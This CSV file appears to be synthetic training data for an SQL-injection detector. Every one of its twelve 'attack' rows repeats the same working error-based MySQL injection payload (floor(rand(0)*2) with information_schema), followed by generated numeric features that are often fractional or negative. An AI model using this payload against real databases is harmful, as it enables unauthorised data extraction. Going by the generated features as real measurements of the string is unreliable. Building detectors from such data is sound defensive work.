id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.769877870888054,289.3800964355469,88.58726501464844,42.60387420654297,112.6417465209961,2.9592981338500977,86.26425170898438,40.55060577392578,1.0018280744552612,0.31643596291542053,0.14419469237327576,0.39113110303878784,0.13431547582149506,3.830909490585327,1.7530930042266846,0.5977913737297058,0.6204298734664917,0.11282125860452652,0.01491596084088087,0.0021109171211719513,9.74367904663086,11.506217956542969,3.250675916671753,0.15129625797271729,1.9530513286590576,0.10333455353975296,-0.05646984651684761,0.44174107909202576,0.13093380630016327,0.7810330986976624,0.1422964632511139,-0.012377738952636719,1.6057161092758179,0.024562101811170578,0.384382039308548,2.124920129776001,8.98379898071289,1.072022795677185,2.0881500244140625,0.38855716586112976,0.22644267976284027,0.9735819101333618,0.05817164480686188,0.02654254622757435,-0.12463536858558655,0.18166261911392212,-0.011312656104564667,0.4802248179912567,0.4874877333641052,0.4631294310092926,0.4539405405521393,0.5468806624412537,0.031559430062770844,-0.06058652326464653,0.4335000813007355,0.15569402277469635,0.22454684972763062,0.06619054079055786,-0.17938317358493805,0.13863173127174377,-0.011411912739276886,-0.1090724915266037,0.09955497086048126,0.01244974136352539,0.1848750114440918,-0.11598212271928787,0.568549633026123,-0.15385299921035767,-0.10184186697006226,0.048220712691545486,0.12395107746124268,-0.01428304798901081,-0.07967033982276917,0.0769909992814064,-0.055851053446531296,0.04866418614983559,1.0606521368026733,0.4698152542114258,0.14531278610229492,0.1103610247373581,0.4529073238372803,10.273448944091797,0.6814812421798706,0.15430894494056702,0.03326106444001198,0.6724514365196228,-0.020204635336995125,-0.0038699395954608917,-0.06678929179906845
GAN_000012,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.75267743680283,287.0138854980469,91.07254791259766,42.083316802978516,111.25821685791016,5.0971455574035645,84.5049057006836,41.68156051635742,1.003533124923706,0.31221964955329895,0.1484949290752411,0.38834521174430847,0.13161906599998474,3.8304131031036377,1.8086950778961182,0.47269368171691895,0.6576663851737976,0.0855996161699295,-0.0027110790833830833,-0.008653033524751663,10.147329330444336,11.466971397399902,3.283644199371338,0.1281280368566513,1.89658522605896,0.10445266216993332,-0.024275831878185272,0.49384501576423645,0.17218683660030365,0.7704184055328369,0.1379447877407074,0.02987886220216751,1.682106852531433,0.05430879071354866,0.40689343214035034,2.117701530456543,9.06680679321289,1.0505499839782715,2.0410852432250977,0.3658463954925537,0.30763423442840576,0.9512494206428528,0.08696961402893066,0.028479447588324547,-0.1572984755039215,0.09404099732637405,0.08720475435256958,0.4404493570327759,0.5166125297546387,0.5159269571304321,0.4146597683429718,0.5284045934677124,0.10138674825429916,-0.09512694180011749,0.47406959533691406,0.15227527916431427,0.23074382543563843,-0.08150306344032288,-0.11964454501867294,0.062487781047821045,-0.02828662097454071,-0.028005115687847137,0.2077474594116211,0.02843833714723587,0.13733424246311188,-0.061992984265089035,0.564018726348877,-0.19145628809928894,-0.07283630967140198,0.045242585241794586,0.028486918658018112,-0.060266830027103424,-0.05205832049250603,0.07325775921344757,-0.10247969627380371,-0.050254132598638535,1.0714260339736938,0.48022302985191345,0.09429614245891571,0.07696965336799622,0.4937801659107208,10.18062973022461,0.7021999955177307,0.15625475347042084,0.04595530778169632,0.6702427268028259,0.01257963478565216,0.007263690233230591,0.02510663866996765
GAN_000013,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.899432455474752,287.0530090332031,88.5868911743164,42.5875244140625,110.02781677246094,3.507906913757324,86.8176498413086,40.57122802734375,0.9514327645301819,0.3084203600883484,0.1444847732782364,0.3927450478076935,0.1300489753484726,3.8261659145355225,1.588372826576233,0.7524428367614746,0.6130540370941162,0.10667771846055984,-0.02894100919365883,-0.27005529403686523,10.343628883361816,11.505523681640625,2.880537748336792,0.12803182005882263,1.9418295621871948,0.1369495987892151,0.09135011583566666,0.4569283127784729,0.15675343573093414,0.7533138394355774,0.1741640567779541,0.020322285592556,1.5861175060272217,-0.13388386368751526,0.38548213243484497,2.2268483638763428,9.181864738464355,1.096805214881897,2.219529390335083,0.3280526101589203,0.3411182165145874,0.9463865160942078,0.049468860030174255,0.03078240156173706,0.0069560706615448,0.05533494055271149,0.11950317025184631,0.43870994448661804,0.4741878807544708,0.5662176609039307,0.4657483994960785,0.5782829523086548,0.11979801952838898,0.10355222970247269,0.48256751894950867,0.17012952268123627,0.23585835099220276,0.011462345719337463,-0.19109348952770233,0.20203036069869995,0.02638450264930725,-0.041056785732507706,0.040802352130413055,0.02284197509288788,0.3310093283653259,-0.03634195774793625,0.6224797964096069,-0.09446351230144501,-0.18804028630256653,-0.008269533514976501,0.0777820497751236,-0.02386331744492054,-0.02360524609684944,-0.03172570466995239,-0.0021291878074407578,0.020784616470336914,0.9906318783760071,0.47764378786087036,0.16761088371276855,0.1223265752196312,0.4822904169559479,10.25799560546875,0.6991495490074158,0.14171992242336273,0.06022655963897705,0.7024451494216919,0.061267804354429245,-0.09379309415817261,0.0881432294845581
GAN_000014,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.774036438778101,285.4684753417969,90.00294494628906,41.47739028930664,114.29253387451172,2.7902402877807617,86.0633544921875,41.498695373535156,0.843498170375824,0.3137839734554291,0.1423332244157791,0.38926878571510315,0.13142745196819305,3.8459227085113525,1.8098359107971191,0.5155389308929443,0.5848358869552612,0.05504881963133812,-0.0830317810177803,0.09679105877876282,10.006841659545898,11.55312442779541,3.483228921890259,0.21989277005195618,1.9352561235427856,0.09291863441467285,-0.09319635480642319,0.4649798274040222,0.12858189642429352,0.7125896215438843,0.07736083120107651,0.07609578222036362,1.5360398292541504,-0.09010163694620132,0.4022669792175293,2.036792039871216,8.961843490600586,1.042540192604065,2.1089043617248535,0.3135541081428528,0.24051235616207123,1.0516295433044434,0.05682427063584328,0.028893975540995598,-0.05109884962439537,0.11689931154251099,0.08877496421337128,0.4692227244377136,0.47830110788345337,0.48138806223869324,0.4650045335292816,0.5967207551002502,0.15073338150978088,-0.14012961089611053,0.4264095425605774,0.16048464179039001,0.19239862263202667,0.037177544087171555,-0.17498734593391418,0.1543610692024231,0.029547743499279022,0.042341217398643494,0.09699147194623947,-0.0175899937748909,0.1403132677078247,0.01960575208067894,0.5199476480484009,-0.14004532992839813,-0.12764006853103638,0.07029534876346588,0.017444700002670288,-0.1309279203414917,-0.11083655059337616,-0.013598993420600891,-0.18578265607357025,0.018849272280931473,1.0797348022460938,0.4524706304073334,0.1739964485168457,0.08288638293743134,0.4457515776157379,10.116517066955566,0.7355857491493225,0.17098590731620789,0.008103637956082821,0.652610182762146,-0.05461842566728592,-0.040715064853429794,-0.011408723890781403
GAN_000015,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.862733141411677,287.4581298828125,88.27006530761719,41.13810348510742,108.37889862060547,3.7177927494049072,89.96987915039062,42.05747985839844,1.0703178644180298,0.3016546666622162,0.14882037043571472,0.3887922465801239,0.13203197717666626,3.8409316539764404,1.6611378192901611,0.5897928476333618,0.5365506410598755,0.1064208447933197,-0.1686588078737259,-0.24978262186050415,10.223501205444336,11.602285385131836,2.6509039402008057,0.08504308760166168,1.9880768060684204,0.07622221112251282,-0.060165196657180786,0.408659964799881,0.07404248416423798,0.6918570399284363,0.2807842493057251,0.0690290704369545,1.6176798343658447,-0.07758062332868576,0.41718101501464844,2.14101505279541,8.83582878112793,0.9872919321060181,2.063795804977417,0.5534195303916931,0.2607656419277191,0.9605364799499512,0.02141917496919632,0.026805700734257698,-0.032405875623226166,0.2448851466178894,0.07782866060733795,0.40199437737464905,0.4587829113006592,0.5150566697120667,0.3574083149433136,0.583324134349823,0.12026733160018921,-0.0009426921606063843,0.4826071858406067,0.14752301573753357,0.2018437385559082,-0.028990013524889946,-0.14764241874217987,0.23847031593322754,0.0661759153008461,-0.011599574238061905,0.16915303468704224,-0.011473413556814194,0.34317150712013245,-0.09591050446033478,0.6197257041931152,-0.07381868362426758,-0.27097848057746887,-0.09331318736076355,0.14400672912597656,0.11629504710435867,0.01017763838171959,0.012611724436283112,-0.1401536464691162,0.018408803269267082,0.9748587608337402,0.5326640009880066,0.14639322459697723,0.10862965881824493,0.5138429999351501,10.325529098510742,0.717667281627655,0.1493334323167801,0.06656920909881592,0.7019879221916199,0.003541249781847,0.03764079883694649,0.0061167702078819275
GAN_000016,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.806301730342163,284.66595458984375,91.04135131835938,40.96968078613281,112.16049194335938,6.022709369659424,84.4488525390625,41.49293899536133,0.9345117807388306,0.32850924134254456,0.1491633951663971,0.3919253945350647,0.1348283886909485,3.8516619205474854,1.6616063117980957,0.4791630506515503,0.5569700002670288,0.06620365381240845,0.00758304912596941,-0.09951667487621307,10.306658744812012,11.292930603027344,3.1348204612731934,0.21084652841091156,1.9944977760314941,0.10572302341461182,0.040654804557561874,0.4383573532104492,0.10367430001497269,0.8157322406768799,0.08202286064624786,-0.02641986310482025,1.498334527015686,-0.018379101529717445,0.38273945450782776,2.1362247467041016,8.950798034667969,1.1574152708053589,2.2566897869110107,0.376942902803421,0.29956138134002686,0.9244269728660583,0.1114184707403183,0.03868913650512695,-0.10243364423513412,0.07933516800403595,-0.07659953087568283,0.4811251163482666,0.4652966558933258,0.515743613243103,0.46869784593582153,0.5247414708137512,-0.023685507476329803,-0.024271085858345032,0.5059503316879272,0.10617497563362122,0.1618984341621399,-0.28468915820121765,-0.004330269992351532,0.13685160875320435,-0.02988581359386444,-0.131048321723938,0.19525310397148132,-0.01965508796274662,0.09137222170829773,-0.07293939590454102,0.4990988075733185,-0.10620824247598648,-0.10875177383422852,0.08606147766113281,0.16002553701400757,0.12078306078910828,0.0718393623828888,-0.010350644588470459,0.017594806849956512,-0.1261427253484726,1.012142539024353,0.5283023715019226,0.10511976480484009,0.08938898891210556,0.49732252955436707,10.139705657958984,0.724624752998352,0.13871872425079346,0.057848501950502396,0.6638782024383545,-0.027181033045053482,-0.004834536463022232,0.07994972169399261
GAN_000017,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.931831495550832,286.9598388671875,88.11326599121094,40.714317321777344,110.39647674560547,3.03381609916687,90.66478729248047,41.97164535522461,0.8952251672744751,0.3157476782798767,0.1515268087387085,0.3923024833202362,0.13261215388774872,3.88799786567688,1.7307305335998535,0.6047087907791138,0.47257915139198303,0.09606713056564331,-0.02145550772547722,-0.1004469245672226,10.557754516601562,11.48410415649414,2.923011541366577,0.10987521708011627,1.842681646347046,0.09778796136379242,0.017681416124105453,0.3537795841693878,0.1560477912425995,0.6465619802474976,0.27029353380203247,-0.11281682550907135,1.6982778310775757,-0.1156955361366272,0.408241331577301,2.0761377811431885,8.622133255004883,1.1817361116409302,2.327554702758789,0.44364607334136963,0.31787702441215515,0.8950576782226562,0.005279816687107086,0.041905537247657776,-0.034118957817554474,0.12453078478574753,0.20628145337104797,0.4907161295413971,0.520014762878418,0.6071181297302246,0.4832574725151062,0.5298900604248047,0.24777212738990784,-0.17107883095741272,0.42152461409568787,0.1640654355287552,0.21094240248203278,-0.057578206062316895,-0.21181799471378326,0.3438712954521179,-0.07465360313653946,-0.0718463882803917,0.17433913052082062,-0.07172594219446182,0.2955784201622009,-0.05694957077503204,0.5119907855987549,0.07960581034421921,-0.2586849331855774,-0.06239759922027588,0.02374947816133499,-0.013847293332219124,0.051087748259305954,-0.1673245131969452,-0.11953091621398926,-0.133527934551239,0.9586402773857117,0.4904618561267853,0.13353118300437927,0.13081154227256775,0.45800280570983887,9.817026138305664,0.7916075587272644,0.1442568451166153,0.047850288450717926,0.7693241834640503,0.16021454334259033,-0.12394706904888153,0.060942456126213074
GAN_000018,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.859034389504581,290.11083984375,86.31666564941406,42.49634552001953,112.89678192138672,3.9067137241363525,89.3384017944336,39.31887435913086,0.8195779323577881,0.3166809678077698,0.140166237950325,0.38998138904571533,0.13448017835617065,3.877129554748535,1.868338942527771,0.685997724533081,0.41497862339019775,0.01974461041390896,0.06355413049459457,-0.11885445564985275,10.061577796936035,11.609374046325684,3.28051495552063,0.1735355705022812,1.9719949960708618,0.10946505516767502,0.019575275480747223,0.3589211106300354,0.13336682319641113,0.8525436520576477,0.1788214147090912,-0.04854736477136612,1.535435676574707,-0.16555890440940857,0.315577894449234,2.123790740966797,9.055591583251953,1.038642406463623,2.0924863815307617,0.2201063483953476,0.3011840879917145,0.987684965133667,-0.12246263772249222,0.024630224332213402,-0.06177208945155144,0.20792022347450256,0.029432207345962524,0.5219343900680542,0.49062085151672363,0.5775314569473267,0.5361578464508057,0.6205146908760071,4.0374696254730225e-05,0.10081911832094193,0.5321083664894104,0.197230264544487,0.16956248879432678,0.05775388702750206,-0.09433206170797348,0.2642783224582672,0.07074295729398727,0.18251700699329376,-0.010623745620250702,-0.08813758194446564,0.029403623193502426,-0.01226251944899559,0.380133718252182,0.051013581454753876,-0.07658921927213669,0.12724637985229492,-0.1599048674106598,0.04105161130428314,0.06951796263456345,-0.0017659589648246765,-0.009855457581579685,-0.16550907492637634,0.9841505885124207,0.4049597382545471,0.23918534815311432,0.053165871649980545,0.47249600291252136,10.30639362335205,0.7935006618499756,0.16810902953147888,0.028211284428834915,0.6182005405426025,0.06335286796092987,0.20559856295585632,0.2480969876050949
GAN_000019,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.898989085929137,282.0964660644531,88.22737121582031,41.16019058227539,110.57418060302734,2.5870707035064697,89.76201629638672,41.4539680480957,0.8565075397491455,0.3143135905265808,0.14410211145877838,0.3933488130569458,0.1293143481016159,3.85135817527771,1.6212589740753174,0.8534775376319885,0.4650003910064697,0.10272231698036194,-0.0802769809961319,-0.23993757367134094,10.653570175170898,11.957027435302734,2.775709629058838,0.1444651186466217,1.9378854036331177,0.11519848555326462,0.09277910739183426,0.4536762535572052,0.0921667218208313,0.6740179061889648,0.25247061252593994,0.06778811663389206,1.5497171878814697,-0.3211491107940674,0.425101101398468,2.2102558612823486,9.107333183288574,1.0949053764343262,2.3044731616973877,0.4202362895011902,0.23704774677753448,1.0142847299575806,-0.1401098072528839,0.05650477111339569,0.144706130027771,0.07336515188217163,0.10092845559120178,0.45449939370155334,0.41776201128959656,0.5745605826377869,0.43813949823379517,0.5748869180679321,0.2717040181159973,0.14442068338394165,0.4910198152065277,0.14324550330638885,0.19502969086170197,-0.1368073970079422,-0.20841163396835327,0.24643445014953613,0.29701557755470276,-0.05035628378391266,0.0561419315636158,-0.10065602511167526,0.42569634318351746,-0.09509538114070892,0.5947449207305908,0.08616896718740463,-0.40028759837150574,-0.0526418536901474,0.039049357175827026,0.10193336009979248,-0.10667221248149872,-0.055512189865112305,-0.040509384125471115,-0.10095131397247314,1.0261362791061401,0.5292062163352966,0.23500216007232666,0.09457313269376755,0.49509963393211365,10.215147018432617,0.7289046049118042,0.13019785284996033,0.05030565708875656,0.7585878372192383,0.06752917170524597,0.031176719814538956,0.03886997699737549
GAN_000020,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.907571920081886,287.23553466796875,87.19236755371094,41.70369338989258,109.15264892578125,3.5038399696350098,87.30692291259766,40.91020584106445,0.9792370796203613,0.3160402178764343,0.1462486833333969,0.3910977840423584,0.1314983367919922,3.840501070022583,1.5439954996109009,0.693321168422699,0.5327666997909546,0.12256075441837311,-0.007106798700988293,-0.2678898572921753,10.529440879821777,11.411667823791504,2.7430481910705566,0.12536443769931793,2.009215831756592,0.13102379441261292,0.07548975944519043,0.4670320749282837,0.1416083574295044,0.7647733688354492,0.2670384347438812,0.019942201673984528,1.5295826196670532,-0.17220795154571533,0.3686707317829132,2.302053213119507,9.10887622833252,1.0206834077835083,2.214451789855957,0.3759934604167938,0.32098060846328735,0.965961217880249,0.036570724099874496,0.02798622101545334,0.022302664816379547,0.1240568608045578,0.0642419308423996,0.4212966561317444,0.4836128056049347,0.5437771081924438,0.43090593814849854,0.5956096649169922,0.06486982107162476,0.10211316496133804,0.4901357591152191,0.16656269133090973,0.18948152661323547,-0.0268547385931015,-0.20358547568321228,0.1728685200214386,0.09040119498968124,0.0333980992436409,0.1042182445526123,0.021066367626190186,0.2961965799331665,-0.010362297296524048,0.6065005660057068,-0.033778898417949677,-0.23666875064373016,-0.04348766803741455,0.13259407877922058,0.029787708073854446,-0.010181386023759842,-0.052294179797172546,-0.07455174624919891,0.02881140075623989,0.9700552821159363,0.47616052627563477,0.13635757565498352,0.12765835225582123,0.49755653738975525,10.457315444946289,0.6953483819961548,0.12992088496685028,0.06594602763652802,0.6915815472602844,-0.019281072542071342,0.049348536878824234,0.057261139154434204
GAN_000021,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.745787908149591,286.9459228515625,91.58109283447266,41.858314514160156,114.15667724609375,6.347384452819824,84.69371032714844,41.30381393432617,1.0284603834152222,0.3141666054725647,0.14513684809207916,0.38893577456474304,0.1325116753578186,3.8332126140594482,1.783696174621582,0.5856702923774719,0.6935131549835205,0.06787373125553131,-0.0027616964653134346,0.005721013993024826,9.979196548461914,11.172813415527344,3.6281490325927734,0.1317853033542633,1.963529348373413,0.09327591210603714,0.002259876811876893,0.509952962398529,0.13815298676490784,0.808570921421051,0.12575113773345947,-0.013020642101764679,1.5696771144866943,0.08523909002542496,0.375008761882782,2.143463373184204,8.589338302612305,0.8912704586982727,2.0110788345336914,0.30766913294792175,0.29185751080513,1.0110955238342285,0.11832556128501892,0.02520836889743805,-0.1032973974943161,0.2116519808769226,0.006802715361118317,0.4655017554759979,0.4536035656929016,0.4898110330104828,0.3974544107913971,0.6423349976539612,0.09794330596923828,-0.10478199273347855,0.4646776020526886,0.18227143585681915,0.23893360793590546,-0.0150844044983387,-0.07728902995586395,0.13598325848579407,0.02911081165075302,0.05524572730064392,0.20125612616539001,-0.02356332167983055,0.0684160590171814,-0.011312328279018402,0.5527338981628418,-0.1879679262638092,-0.12909731268882751,0.0514669306576252,0.014359399676322937,-0.10165166854858398,-0.14194346964359283,-0.03902485966682434,-0.12123598158359528,0.04334062337875366,1.0991361141204834,0.4659940302371979,0.141741082072258,0.04238755255937576,0.4398568868637085,10.092622756958008,0.7201272249221802,0.19172795116901398,0.0144856171682477,0.6850348114967346,-0.1459488570690155,0.09037083387374878,-0.02338699996471405
GAN_000022,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.8443532512707295,286.4847412109375,88.64732360839844,41.28238296508789,109.4175796508789,6.027200222015381,86.40280151367188,41.20049285888672,0.9537574052810669,0.31863871216773987,0.1469121128320694,0.3871173560619354,0.13291238248348236,3.855595588684082,1.492954134941101,0.4798779785633087,0.4986173212528229,0.10052160918712616,-0.003651105798780918,-0.1206483468413353,10.48023509979248,11.263543128967285,2.8906257152557373,0.17175450921058655,1.9431544542312622,0.13356450200080872,0.10225658118724823,0.498311311006546,0.14071297645568848,0.7529299855232239,0.21371494233608246,-0.045799486339092255,1.5732338428497314,-0.10279712080955505,0.36074599623680115,2.279632806777954,9.044135093688965,1.0349234342575073,2.1385934352874756,0.290778249502182,0.3298186659812927,1.0380746126174927,0.10811848938465118,0.02266058139503002,-0.036765821278095245,0.03046676516532898,0.02412666380405426,0.45725181698799133,0.49788546562194824,0.509402334690094,0.48884251713752747,0.5476163625717163,-0.0066978782415390015,0.05341965705156326,0.4988025724887848,0.14908145368099213,0.18507419526576996,-0.09943661093711853,-0.2173595279455185,0.24401405453681946,0.03803453594446182,-0.01191287487745285,0.10225459933280945,0.008793499320745468,0.2968669831752777,0.0156412236392498,0.5258120894432068,-0.09449518471956253,-0.17669770121574402,-0.049950867891311646,0.08596548438072205,-0.03655771166086197,-0.05411352589726448,-0.1255049854516983,-0.0900401622056961,0.010796580463647842,0.9377486705780029,0.42626142501831055,0.08183103054761887,0.1329711377620697,0.4770418703556061,10.434093475341797,0.7101610898971558,0.16307160258293152,0.05315013974905014,0.6797754168510437,-0.0853484496474266,-0.061464302241802216,0.1030171662569046
